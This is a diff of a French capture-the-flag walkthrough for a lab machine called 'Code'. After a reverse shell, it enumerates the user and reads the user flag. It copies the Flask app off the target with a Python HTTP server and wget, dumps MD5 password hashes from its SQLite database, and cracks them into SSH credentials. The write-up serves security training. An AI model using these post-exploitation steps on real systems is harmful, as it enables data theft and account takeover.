@@ -613,35 +613,210 @@ Tu stabilises ensuite le shell via la recette {{< recette "stabiliser-reverse-sh
 
 ### Exploration du reverse shell
 
+Une fois le reverse shell obtenu stabilisé, tu peux commencer par identifier le contexte d’exécution du shell.
+
+Tu vérifies d’abord l’utilisateur courant, le répertoire actif et les groupes associés :
+
 ```bash
-app-production@code:~/app$ find / -name user.txt 2>/dev/null
+app-production@code:~/app$ whoami
+whoami
+app-production
+app-production@code:~/app$ pwd
+pwd
+/home/app-production/app
+app-production@code:~/app$ id
+id
+uid=1001(app-production) 
+```
+
+#### user.txt
+
+Tu recherches ensuite le flag utilisateur :
+
+```bash
 find / -name user.txt 2>/dev/null
+```
+
+Résultat :
+
+```bash
 /home/app-production/user.txt
-app-production@code:~/app$ cd ..
+```
+
+Tu remontes alors dans le répertoire personnel de l’utilisateur :
+
+```bash
 cd ..
-app-production@code:~$ ls -l
 ls -l
+```
+
+Résultat :
+
+```
 total 8
 drwxrwxr-x 6 app-production app-production 4096 Feb 20  2025 app
 -rw-r----- 1 root           app-production   33 May  6 08:05 user.txt
-app-production@code:~$
+```
+
+Le fichier `user.txt` est lisible par le groupe `app-production`, ce qui permet de récupérer directement le flag utilisateur :
+
+```bash
+cat user.txt
+7e5dxxxxxxxxxxxxxxxxxxxxxxxxxxxdc23
 ```
 
 
 
+#### Exploration des répertoires
 
+Tu peux ensuite examiner le contenu du répertoire de l’application :
+
+```bash
+cd app
+ls -l
+```
+
+Résultat :
+
+```bash
+total 24
+-rw-r--r-- 1 app-production app-production 5230 Feb 20  2025 app.py
+drwxr-xr-x 2 app-production app-production 4096 Feb 20  2025 instance
+drwxr-xr-x 2 app-production app-production 4096 Feb 20  2025 __pycache__
+drwxr-xr-x 3 app-production app-production 4096 Aug 27  2024 static
+drwxr-xr-x 2 app-production app-production 4096 Feb 20  2025 templates
+```
+
+Le répertoire contient le code principal de l’application Flask (`app.py`) ainsi que les dossiers classiques d’une application web Python :
+
+- `templates` pour les pages HTML ;
+- `static` pour les fichiers statiques ;
+- `instance` pour les données locales ;
+- `__pycache__` pour les fichiers Python compilés.
+
+À ce stade, `app.py` devient naturellement le premier fichier à examiner.
+
+#### Téléchargement du répertoire `app/`
+
+Comme le reverse shell reste instable, il est plus pratique de récupérer localement l’ensemble du répertoire de l’application pour l’analyser depuis Kali.
+
+Tu peux utiliser la méthode décrite dans la recette `{{< recette "copier-fichiers-kali" >}}`.
+
+Depuis la cible, tu lances un serveur HTTP Python dans le répertoire `/home/app-production` :
+
+```bash
+cd /home/app-production
+python3 -m http.server 8000
+```
+
+Depuis Kali, tu télécharges ensuite le répertoire `app` avec `wget` :
+
+```bash
+wget -r http://code.htb:8000/app/
+```
+
+`wget` crée alors localement sur Kali un dossier nommé d’après l’hôte et le port du serveur HTTP :
+
+```bash
+code.htb:8000/
+```
+
+L’arborescence téléchargée se retrouve ensuite dans :
+
+```bash
+code.htb:8000/app/
+```
+
+Tu récupères ainsi :
+
+- `app.py`
+- `instance/`
+- les templates Flask ;
+- les fichiers statiques ;
+- l’arborescence complète de l’application.
+
+Cette approche permet d’analyser les fichiers confortablement depuis Kali sans dépendre de la stabilité du reverse shell.
+
+#### Analyse de `app.py`
+
+L’examen de `app.py` révèle que l’application utilise une base SQLite locale :
+
+```python
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
+```
+
+Le modèle `User` montre que cette base contient des comptes utilisateurs :
+
+```python
+class User(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(80), unique=True, nullable=False)
+    password = db.Column(db.String(80), nullable=False)
+```
+
+Les mots de passe sont stockés en MD5 :
+
+```python
+password = hashlib.md5(request.form['password'].encode()).hexdigest()
+```
+
+L’application possède donc une base SQLite contenant des utilisateurs et leurs hashes MD5.
+
+Tu peux vérifier que le dossier `instance` contient bien cette base de données :
+
+```bash
+ls -l instance/
+```
+
+Résultat :
+
+```bash
+total 16
+-rw-r--r-- 1 app-production app-production 16384 May 11 08:00 database.db
+```
+
+
+
+#### Analyse de database.db
+
+Une fois la base récupérée sur Kali, tu peux l’explorer avec `sqlite3` :
+
+```sqlite
+sqlite3 database.db   
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite> .tables
+code  user
+sqlite> SELECT * FROM user;
+1|development|759b74ce43947f5f4c91aeddc3e5bad3
+2|martin|3de6f30c4a09c27fc71932bfc68474be
+
+```
+
+La base contient donc deux utilisateurs ainsi que leurs hashes MD5 :
+
+- `development`
+- `martin`
+
+Tu peux ensuite décoder les deux hashes MD5 par exemple sur [CrackStation](https://crackstation.net/?utm_source=chatgpt.com) :
 
 
 
 ![Résultat du crack de hashes MD5 sur CrackStation montrant les mots de passe development:development et martin:nafeelswordsmaster](crackstation.png)
 
+Le compte le plus intéressant ici est `martin`.
 
+Le shell actuel s’exécute déjà avec l’utilisateur `app-production`. En revanche, `martin` ressemble davantage à un compte utilisateur classique de la machine et peut donc être testé pour une connexion SSH.
 
----
+Tu obtiens ainsi un couple d’identifiants à tester :
+
+```bash
+martin:nafeelswordsmaster
+```
 
 ## Escalade de privilèges
 
-{{< escalade-intro user="ssh_user" >}}
+{{< escalade-intro user="martin" >}}
 
 ### Sudo -l
 Tu commences toujours par vérifier les droits sudo :
